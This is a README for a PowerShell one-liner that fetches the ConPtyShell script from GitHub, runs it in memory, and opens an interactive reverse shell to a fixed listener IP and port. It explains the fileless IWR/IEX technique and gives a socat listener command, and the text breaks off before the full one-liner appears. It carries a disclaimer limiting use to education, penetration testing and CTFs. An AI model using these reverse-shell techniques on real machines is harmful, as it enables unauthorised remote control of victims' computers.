# 🐚 ConPtyShell One-Liner

<div align="center">

[![PowerShell](https://img.shields.io/badge/PowerShell-Core%20%2F%20Windows-blue.svg)](https://github.com/PowerShell/PowerShell)
[![Type](https://img.shields.io/badge/Type-Interactive%20Reverse%20Shell-red.svg)](https://github.com/antonioCoco/ConPtyShell)

*A powerful PowerShell-based interactive Pseudo Console (ConPTY) reverse shell payload for Windows.*

</div>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [How It Works](#-how-it-works)
- [Prerequisites](#-prerequisites)
- [Usage](#-usage)
- [Disclaimer](#-disclaimer)

---

## 🚀 Overview

This one-liner downloads and executes **ConPtyShell** (`Invoke-ConPtyShell.ps1`) directly into memory from the official repository by `antonioCoco`. Unlike basic reverse shells, ConPtyShell creates a fully interactive Windows Pseudo Console (ConPTY), providing a rich terminal experience (supporting things like command history, proper resizing, and text formatting) over a netcat or custom listener.

---

## ⚙️ How It Works

1. **`IWR (Invoke-WebRequest)`**: Fetches the PowerShell script from GitHub using basic parsing.
2. **`IEX (Invoke-Expression)`**: Executes the downloaded script directly in memory without writing it to disk (fileless execution).
3. **`Invoke-ConPtyShell`**: Calls the function, pointing it to the target listener IP (`192.168.178.118`) and port (`33413`).

---

## 📋 Prerequisites

- Windows target machine with PowerShell enabled.
- Network routing/connectivity to the listener IP.
- A listener set up to catch the ConPTY connection.

---

## 💻 Usage

> **⚠️ Warning:** This command is intended strictly for educational purposes, authorized penetration testing, and CTF challenges.

1. **Set up a listener** on your machine (note that ConPtyShell typically requires a specialized listener or a raw socket handler like `socat` or the accompanying C# listener to handle the terminal dimensions properly):
   ```bash
   socat file:`tty`,raw,echo=0 tcp-listen:33413
